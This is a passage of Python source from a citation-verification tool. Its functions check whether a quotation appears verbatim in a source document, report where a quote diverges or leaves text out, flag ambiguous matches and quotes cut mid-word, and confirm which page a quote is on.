    best = min(ways, key=lambda w: (span(w)[1] - span(w)[0], len(w), span(w)[0]))
    a, b = span(best)
    unique = not capped and all(
        w is best or (span(w)[0] <= a and b <= span(w)[1] and span(w) != (a, b)) for w in ways
    )

    def tokens(lo: int, hi: int) -> int:
        """Tokens of the source in doc[lo:hi], which begins and ends on one."""
        return 1 + sum(doc[k] == " " and k not in made for k in range(lo, hi))

    # Each gap as offsets into the passage: past the space after one piece, up to the space
    # before the next.
    left_out = [(e + 1 - a, s - 1 - a) for (_, _, e), (_, s, _) in itertools.pairwise(best)]
    passage, spans, start = doc[a:b], left_out, -1
    if (whole := _stretch(text, doc, a, b)) is not None:
        own = text[whole[0] : whole[1]]
        found = [_stretch(own, passage, x, y) for x, y in left_out]
        if all(found):
            passage, spans, start = own, [f for f in found if f], whole[0]
    return Omission(
        [
            Gap(
                len(" ".join(words[:i])),
                y - x,
                passage[s:e],
                s,
                tokens(a + x, a + y),
                tokens(a, a + x - 1) + 1,
            )
            for (i, _, _), (x, y), (s, e) in zip(best[1:], left_out, spans, strict=True)
        ],
        passage,
        start,
        folded=start < 0,
        fittings=len(ways),
        capped=capped,
        unique=unique,
    )


def divergence(quote: str, text: str) -> tuple[int, str, str]:
    """Where a quotation stops matching its source: how far it got, and what each side reads.

    A bare `not found` points at the document, and the defect is nearly always one character.
    Every instance settled by hand in this corpus had the same shape -- a minus sign the text
    layer dropped, an en dash it dropped, a hyphen falling on a line break where `passage_fold`'s
    de-hyphenation removes a real one -- and finding it meant a binary search for the longest
    prefix of the quotation the document still contains. That search belongs here, so the report
    can do it instead of the reader.

    The offset counts folded characters, which is what was compared. Both excerpts begin a
    little before the split, so the divergence is legible rather than a bare index.
    """
    q, doc = passage_fold(quote), passage_fold(text)
    lo, hi = 0, len(q)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        lo, hi = (mid, hi) if q[:mid] in doc else (lo, mid - 1)
    at = doc.find(q[:lo]) if lo else -1
    quoted = q[max(0, lo - 28) : lo + 34]
    found = doc[max(0, at + lo - 28) : at + lo + 34] if at >= 0 else ""
    return lo, quoted, found


def _not_found(quote: str, text: str) -> str:
    """The `not found` detail, naming the point of divergence where there is one worth naming."""
    n, quoted, found = divergence(quote, text)
    # Worth reporting when the prefix is substantial either absolutely or relative to the
    # quotation: a passage that matched forty characters, or half of itself, and then stopped
    # has located a place in the document and diverged from it. A prefix shorter than both
    # matched by coincidence -- "the results of" occurs everywhere -- and pointing at where it
    # ran out would send a reader to a passage the quotation was never taken from.
    if not found or (n < MIN_QUOTE_CHARS and n * 2 < len(passage_fold(quote))):
        return (
            "read the source: a broken extraction reads the same as a passage that was never there"
        )
    return (
        f"the first {n} characters are in the source and the rest is not\n"
        f"      quoted: ...{quoted}\n"
        f"      source: ...{found}\n"
        f"      one character missing from the source's text layer -- a minus sign, an en dash, "
        f"a hyphen on a line break -- is the usual cause, and is a defect in the extraction "
        f"rather than in the quotation. Split the quotation into adjacent fragments either side "
        f"of it; do not truncate it to the part that matches"
    )


#: How much of the text left out at one gap, and of the whole passage, the printed detail
#: shows. The result carries both in full; a report listing twenty of these does not.
SHOWN_GAP_CHARS = 200
SHOWN_PASSAGE_CHARS = 600


def _omitted(quote: str, found: Omission) -> str:
    """The `not found` detail for a quotation that is the source with text left out."""
    q = passage_fold(quote)

    def line(text: str) -> str:
        return " ".join(text.split())

    def count(n: int, limit: int) -> str:
        """How long the shown text is, counted as shown: on one line, without the marks."""
        size = f"{n:,} character{'' if n == 1 else 's'}"
        return size if n <= limit else f"{size}, the first {limit:,} shown"

    lines = [
        f"every word of the quotation is in the source, as {len(found.gaps) + 1} pieces in the "
        f"source's order with source text left out between them and nothing marking the gap"
    ]
    for g in found.gaps:
        text = line(g.text)
        lines.append(f"      after: ...{q[max(0, g.at - 34) : g.at]}")
        lines.append(
            f"      left out ({g.tokens:,} token{'' if g.tokens == 1 else 's'} of the source, "
            f"{count(len(text), SHOWN_GAP_CHARS)}): [[{text[:SHOWN_GAP_CHARS]}]]"
        )
        lines.append(f"      then:  {q[g.at :].strip()[:34]}...")
    # The passage on one line with each gap marked, cut after SHOWN_PASSAGE_CHARS of the
    # passage's own characters: the marks are not counted and are always closed. A gap is
    # whole tokens, so white space parts it from the piece on either side.
    parts, at = [], 0
    for g in found.gaps:
        parts += [(found.passage[at : g.offset], False), (g.text, True)]
        at = g.offset + len(g.text)
    parts.append((found.passage[at:], False))
    whole, shown, room = line(found.passage), [], SHOWN_PASSAGE_CHARS
    for text, marked in parts:
        text = line(text)[: max(room, 0)]
        room -= len(text) + 1
        if text:
            shown.append(f"[[{text}]]" if marked else text)
    lines.append(
        f"      the source reads ({count(len(whole), SHOWN_PASSAGE_CHARS)}, left-out text in "
        f"[[ ]]): {' '.join(shown)}"
    )
    if found.fittings > 1 or found.capped:
        lines.append(
            f"      the pieces fit the source in "
            f"{'more than ' if found.capped else ''}{found.fittings:,} ways; this is the "
            f"shortest passage" + ("" if found.unique else ", and not inside all the others")
        )
    if found.folded:
        lines.append(
            "      the source text is shown folded, in lower case with single spaces: its own "
            "characters could not be recovered from the extraction"
        )
    lines.append(
        "      to repair it, quote the passage as the source reads, with the left-out text "
        "in it; or, in a manuscript, write an ellipsis where the text is left out, which "
        "`citations coverage` reads as omitted text. As it stands the quotation is `not "
        "found`, with or without `--strict`"
    )
    return "\n".join(lines)


def _ambiguous(n: int, anchored: bool) -> str:
    """Why an ambiguous verdict obtained, and what would settle it."""
    if anchored:
        return (
            f"the passage occurs {n} times and its prefix/suffix do not single one out; "
            f"widen them until exactly one occurrence carries both"
        )
    return (
        f"the passage occurs {n} times in the source, so the record does not say which of "
        f"them it means; add `prefix`/`suffix` naming the text on either side, which "
        f"`citations pin --occurrence N` writes for the occurrence it is given"
    )


def _verdict(
    quote: str,
    full: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    extractor: str = "",
    prefix: str = "",
    suffix: str = "",
) -> Result:
    """The verdict on one passage, against the text an extractor produced.

    Verbatim first, then the whitespace-stripped skeleton, and a count at each level rather
    than a membership test. A passage occurring more than once is `ambiguous` and not `found`:
    the source contains it, and the record has not said which occurrence it is quoting, so any
    page or section attached to it is asserted about a passage nobody identified.
    """
    warn = list(warn)
    q, doc = passage_fold(quote), passage_fold(full)
    if not q:
        # `"" in doc` is True. A quotation that folds away entirely is not a quotation.
        return Result("not found", "the quotation is empty after normalization", warn)

    m = resolve_in(quote, full, prefix, suffix)
    if m.normalized:
        warn.append("normalized")
    if m.state == "ambiguous":
        return Result("ambiguous", _ambiguous(m.count, bool(prefix or suffix)), warn)
    if m.state == "not found":
        if (found := omission(quote, full)) is not None:
            return Result(
                "not found",
                _omitted(quote, found),
                warn,
                reason=OMISSION,
                gaps=found.gaps,
                passage=found.passage,
                passage_folded=found.folded,
            )
        return Result("not found", _not_found(quote, full), warn)
    if m.normalized:
        # The skeleton dropped the whitespace the token check reads, so neither a cut word
        # nor a page number means anything against it.
        return Result("found", "", warn)
    if _cuts_a_token(q, doc):
        warn.append("truncated")
    if page and not _on_page(artifact, q, page, extractor):
        warn.append("page")
        found_at, capped = _find_page(artifact, q, reader=extractor)
        detail = f"not on page {page}"
        if found_at is None and capped:
            detail += f"; searched the first {PAGE_SCAN_LIMIT} pages"
        return Result("found", detail, warn, found_at)
    return Result("found", "", warn)


def _on_page(artifact: pathlib.Path, folded_quote: str, page: int, extractor: str = "") -> bool:
    """Is the quote on the page the record claims? An unreadable page is not a match.

    Read with the extractor that produced the document's text. Asking a second one which page
    a passage is on would report the disagreement between two extractions as a page number the
    record got wrong.
    """
    try:
        return folded_quote in passage_fold(_page_text(artifact, page, extractor))
    except SourceUnreadableError:
        return False


def _page_text(artifact: pathlib.Path, page: int, extractor: str) -> str:
    """One page's text, from whatever produced the document's text.

    The default path goes back through `extract`, so a caller that replaced it fixes what each
    page says as well as what the document says -- which is what a per-page stub is for, and
    what the wrong-page check depends on.
    """
    if extractor in ("", PLAIN_TEXT, SUBSTITUTED, DEFAULT_EXTRACTOR):
        return extract(artifact, page)
    return reading_with(artifact, page, extractor=extractor).text


def _cuts_a_token(q: str, doc: str) -> bool:
    """Does every occurrence of the quote stop in the middle of a word or a number?

    `"an accuracy of 0.9"` is genuinely present in a source reporting **0.95**, so it is `found`
    and the reader is told a true thing that misstates the result. The same cut turns
    `"We trained 50"` into `"We trained 5"`. This is not the `short` warning: length is not the
    problem, and a long quote ending one digit early is the more convincing version of it.

    Every occurrence must cut, because a quote that lands cleanly somewhere in the document is
    quoting that place.
    """
    if not q or not q[-1].isalnum():
        return False
    at, seen = doc.find(q), False
    while at >= 0:
        seen = True
        after = at + len(q)
        if after >= len(doc) or not doc[after].isalnum():
            return False
        at = doc.find(q, at + 1)
    return seen


def is_paginated(artifact: pathlib.Path) -> bool:
    """Whether asking which page a passage is on means anything for this source."""
    suffix = artifact.suffix.lower()
    return suffix not in TEXT_SUFFIXES and suffix not in extractors.BY_SUFFIX


def _find_page(
    artifact: pathlib.Path,
    folded_quote: str,
    limit: int = PAGE_SCAN_LIMIT,
    reader: str = "",
) -> tuple[int | None, bool]:
    """Which page holds the quote, and whether the scan hit its limit without deciding.

    The second element exists so a caller can tell "searched the whole document and it is not
    on any page" from "stopped searching at page N". Reporting both as `None` makes a cap look
    like a finding.

    A source with no pages answers `(None, False)` at once. Extraction ignores the page number
    there, so a scan would return the same text `limit` times and then claim it had searched
    that many pages of a document that has none.
    """
    if not is_paginated(artifact):
        return None, False
    for p in range(1, limit + 1):
        try:
            text = _page_text(artifact, p, reader)
        except SourceUnreadableError:
            return None, False
        if not text:
            return None, False  # ran off the end of the document
        if folded_quote in passage_fold(text):
            return p, False
    return None, True  # still going when the limit ran out
